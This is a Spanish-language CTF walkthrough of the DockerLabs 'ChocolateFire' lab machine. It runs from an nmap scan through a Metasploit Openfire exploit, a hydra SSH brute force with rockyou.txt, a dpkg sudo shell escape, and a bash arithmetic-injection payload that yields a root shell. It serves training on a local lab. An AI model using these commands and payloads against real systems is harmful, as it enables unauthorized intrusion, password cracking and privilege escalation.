### ChocolateFire-DockerLabs🇪🇸

#### 1. Primero vamos a descomprimir el archivo y encendemos el laboratorio.
```bash
unzip chocolatefire.zip
sudo bash ./auto_deploy.sh chocolatefire.tar 
```

<img width="810" height="574" alt="image" src="https://github.com/user-attachments/assets/8b6e4c21-b80d-4561-a47c-e608fa467576" />


#### 1.2 Realizaremos un ping para comprobar el estado de la máquina.
```bash
ping -c3 172.17.0.2
```

<img width="814" height="229" alt="image" src="https://github.com/user-attachments/assets/2fa78135-798a-499c-893a-3d9ad92dd071" />


#### 2. Realizaremos un rastreo de puertos mediante nmap.
```bash
nmap -p- -sCV 172.17.0.2
```

<img width="807" height="1048" alt="image" src="https://github.com/user-attachments/assets/566320c7-8a42-4b4b-b64e-aabbcb45a0e4" />



#### 3. Vemos en el puerto 9090 un http con un formulario.

<img width="1111" height="791" alt="image" src="https://github.com/user-attachments/assets/eddbd6fd-67d6-475c-b32c-68964446056c" />


#### 4. Entraremos a la consola msf para buscar el exploit para Openfire.
```bash
msfconsole
search Openfire
```

<img width="809" height="1046" alt="image" src="https://github.com/user-attachments/assets/621d73eb-9bb9-4301-930b-4203a1242b05" />


#### 4.2 En la linea 4 tenemos la versión que queremos explotar.
```bash
use 4
options
set LHOST <NUESTRA IP>
set RHOSTS 172.17.0.2
run
```

<img width="808" height="1043" alt="image" src="https://github.com/user-attachments/assets/834b7bff-c4ad-4174-bdd8-27f0f0133926" />


### En este punto ya hemos accedido como root pero vamos a realizar otra manera para ver si podemos escalar privilegios.

#### 4.3 Realisamos un ls en `/home` para ver los usuarios

<img width="811" height="78" alt="image" src="https://github.com/user-attachments/assets/48d1026f-b56d-4659-899c-109e0d192593" />


#### 5. Realizamos hydra para encontrar la password y acceder como usuario.
```bash
hydra -l chocolatitochingon -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.17.0.2
```

<img width="809" height="306" alt="image" src="https://github.com/user-attachments/assets/e537d7cb-5b5a-4ee7-8530-e6f5ebe3041e" />


#### 6. Al tener la password realizamos el ssh para acceder.
```bash
ssh chocolatitochingon@172.17.0.2
# passwd: chocolate
```

<img width="806" height="422" alt="image" src="https://github.com/user-attachments/assets/f38bfaf3-0f2c-441e-9f7b-3849839eb76d" />


#### 7. Realizamos un ´sudo -l´ para ver los binarios que podemos manipular.

<img width="814" height="149" alt="image" src="https://github.com/user-attachments/assets/4a165c05-41b5-4527-886b-eabe57c4a72f" />


#### 8. Vamos a utilizar el dpkg para cambiar al usuario de pinguinacio
```bash
sudo -u pinguinacio /usr/bin/dpkg -l
!/bin/bash
```

<img width="1061" height="773" alt="image" src="https://github.com/user-attachments/assets/b0ceebe5-290d-4fe0-b5ee-42126b985a87" />


#### 9. Veremos los binarios del nuevo usuario con `sudo -l`

<img width="1066" height="111" alt="image" src="https://github.com/user-attachments/assets/1536dec5-41a9-45a0-a140-7bfef3b123de" />


#### 10. Leeremos el archivo y vemos que es un programa en bash el cual podemos manipular en el input y poder escribir `a[$(/bin/bash >&2)]+1` para que antes de que el programa evalue falle y nos considere como usuario root. 

<img width="1060" height="323" alt="image" src="https://github.com/user-attachments/assets/02b7e9d9-038c-4749-82f6-f6cbc64aaf8b" />








